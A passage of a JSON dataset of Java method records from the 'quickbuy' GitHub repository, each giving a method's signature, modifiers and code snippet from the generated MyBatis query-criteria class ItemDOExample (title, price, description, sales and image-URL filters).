}", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55818, "method_name": "andTitleBetween", "class_name": "GeneratedCriteria", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleBetween(String value1, String value2) {\n            addCriterion(\"title between\", value1, value2, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55819, "method_name": "andTitleNotBetween", "class_name": "GeneratedCriteria", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleNotBetween(String value1, String value2) {\n            addCriterion(\"title not between\", value1, value2, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55820, "method_name": "andPriceIsNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceIsNull() {\n            addCriterion(\"price is null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55821, "method_name": "andPriceIsNotNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceIsNotNull() {\n            addCriterion(\"price is not null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55822, "method_name": "andPriceEqualTo", "class_name": "GeneratedCriteria", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceEqualTo(BigDecimal value) {\n            addCriterion(\"price =\", value, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55823, "method_name": "andPriceNotEqualTo", "class_name": "GeneratedCriteria", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceNotEqualTo(BigDecimal value) {\n            addCriterion(\"price <>\", value, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55824, "method_name": "andPriceGreaterThan", "class_name": "GeneratedCriteria", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceGreaterThan(BigDecimal value) {\n            addCriterion(\"price >\", value, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55825, "method_name": "andPriceGreaterThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceGreaterThanOrEqualTo(BigDecimal value) {\n            addCriterion(\"price >=\", value, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55826, "method_name": "andPriceLessThan", "class_name": "GeneratedCriteria", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceLessThan(BigDecimal value) {\n            addCriterion(\"price <\", value, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55827, "method_name": "andPriceLessThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceLessThanOrEqualTo(BigDecimal value) {\n            addCriterion(\"price <=\", value, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55828, "method_name": "andPriceIn", "class_name": "GeneratedCriteria", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceIn(List<BigDecimal> values) {\n            addCriterion(\"price in\", values, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55829, "method_name": "andPriceNotIn", "class_name": "GeneratedCriteria", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceNotIn(List<BigDecimal> values) {\n            addCriterion(\"price not in\", values, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55830, "method_name": "andPriceBetween", "class_name": "GeneratedCriteria", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceBetween(BigDecimal value1, BigDecimal value2) {\n            addCriterion(\"price between\", value1, value2, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55831, "method_name": "andPriceNotBetween", "class_name": "GeneratedCriteria", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPriceNotBetween(BigDecimal value1, BigDecimal value2) {\n            addCriterion(\"price not between\", value1, value2, \"price\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55832, "method_name": "andDescriptionIsNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionIsNull() {\n            addCriterion(\"description is null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55833, "method_name": "andDescriptionIsNotNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionIsNotNull() {\n            addCriterion(\"description is not null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55834, "method_name": "andDescriptionEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionEqualTo(String value) {\n            addCriterion(\"description =\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55835, "method_name": "andDescriptionNotEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotEqualTo(String value) {\n            addCriterion(\"description <>\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55836, "method_name": "andDescriptionGreaterThan", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionGreaterThan(String value) {\n            addCriterion(\"description >\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55837, "method_name": "andDescriptionGreaterThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionGreaterThanOrEqualTo(String value) {\n            addCriterion(\"description >=\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55838, "method_name": "andDescriptionLessThan", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionLessThan(String value) {\n            addCriterion(\"description <\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55839, "method_name": "andDescriptionLessThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionLessThanOrEqualTo(String value) {\n            addCriterion(\"description <=\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55840, "method_name": "andDescriptionLike", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionLike(String value) {\n            addCriterion(\"description like\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55841, "method_name": "andDescriptionNotLike", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotLike(String value) {\n            addCriterion(\"description not like\", value, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55842, "method_name": "andDescriptionIn", "class_name": "GeneratedCriteria", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionIn(List<String> values) {\n            addCriterion(\"description in\", values, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55843, "method_name": "andDescriptionNotIn", "class_name": "GeneratedCriteria", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotIn(List<String> values) {\n            addCriterion(\"description not in\", values, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55844, "method_name": "andDescriptionBetween", "class_name": "GeneratedCriteria", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionBetween(String value1, String value2) {\n            addCriterion(\"description between\", value1, value2, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55845, "method_name": "andDescriptionNotBetween", "class_name": "GeneratedCriteria", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotBetween(String value1, String value2) {\n            addCriterion(\"description not between\", value1, value2, \"description\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55846, "method_name": "andSalesIsNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesIsNull() {\n            addCriterion(\"sales is null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55847, "method_name": "andSalesIsNotNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesIsNotNull() {\n            addCriterion(\"sales is not null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55848, "method_name": "andSalesEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesEqualTo(Integer value) {\n            addCriterion(\"sales =\", value, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55849, "method_name": "andSalesNotEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesNotEqualTo(Integer value) {\n            addCriterion(\"sales <>\", value, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55850, "method_name": "andSalesGreaterThan", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesGreaterThan(Integer value) {\n            addCriterion(\"sales >\", value, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55851, "method_name": "andSalesGreaterThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesGreaterThanOrEqualTo(Integer value) {\n            addCriterion(\"sales >=\", value, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55852, "method_name": "andSalesLessThan", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesLessThan(Integer value) {\n            addCriterion(\"sales <\", value, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55853, "method_name": "andSalesLessThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesLessThanOrEqualTo(Integer value) {\n            addCriterion(\"sales <=\", value, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55854, "method_name": "andSalesIn", "class_name": "GeneratedCriteria", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesIn(List<Integer> values) {\n            addCriterion(\"sales in\", values, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55855, "method_name": "andSalesNotIn", "class_name": "GeneratedCriteria", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesNotIn(List<Integer> values) {\n            addCriterion(\"sales not in\", values, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55856, "method_name": "andSalesBetween", "class_name": "GeneratedCriteria", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesBetween(Integer value1, Integer value2) {\n            addCriterion(\"sales between\", value1, value2, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55857, "method_name": "andSalesNotBetween", "class_name": "GeneratedCriteria", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andSalesNotBetween(Integer value1, Integer value2) {\n            addCriterion(\"sales not between\", value1, value2, \"sales\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55858, "method_name": "andImgUrlIsNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlIsNull() {\n            addCriterion(\"img_url is null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55859, "method_name": "andImgUrlIsNotNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlIsNotNull() {\n            addCriterion(\"img_url is not null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55860, "method_name": "andImgUrlEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlEqualTo(String value) {\n            addCriterion(\"img_url =\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55861, "method_name": "andImgUrlNotEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlNotEqualTo(String value) {\n            addCriterion(\"img_url <>\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55862, "method_name": "andImgUrlGreaterThan", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlGreaterThan(String value) {\n            addCriterion(\"img_url >\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55863, "method_name": "andImgUrlGreaterThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlGreaterThanOrEqualTo(String value) {\n            addCriterion(\"img_url >=\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55864, "method_name": "andImgUrlLessThan", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlLessThan(String value) {\n            addCriterion(\"img_url <\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55865, "method_name": "andImgUrlLessThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlLessThanOrEqualTo(String value) {\n            addCriterion(\"img_url <=\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55866, "method_name": "andImgUrlLike", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlLike(String value) {\n            addCriterion(\"img_url like\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55867, "method_name": "andImgUrlNotLike", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlNotLike(String value) {\n            addCriterion(\"img_url not like\", value, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55868, "method_name": "andImgUrlIn", "class_name": "GeneratedCriteria", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlIn(List<String> values) {\n            addCriterion(\"img_url in\", values, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55869, "method_name": "andImgUrlNotIn", "class_name": "GeneratedCriteria", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlNotIn(List<String> values) {\n            addCriterion(\"img_url not in\", values, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55870, "method_name": "andImgUrlBetween", "class_name": "GeneratedCriteria", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlBetween(String value1, String value2) {\n            addCriterion(\"img_url between\", value1, value2, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55871, "method_name": "andImgUrlNotBetween", "class_name": "GeneratedCriteria", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andImgUrlNotBetween(String value1, String value2) {\n            addCriterion(\"img_url not between\", value1, value2, \"imgUrl\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55872, "method_name": "getCondition", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getCondition() {\n            return condition;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55873, "method_name": "getValue", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {\n            return value;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55874, "method_name": "getSecondValue", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getSecondValue() {\n            return secondValue;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55875, "method_name": "isNoValue", "class_name": "Criterion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isNoValue() {\n            return noValue;\n        }", "url": 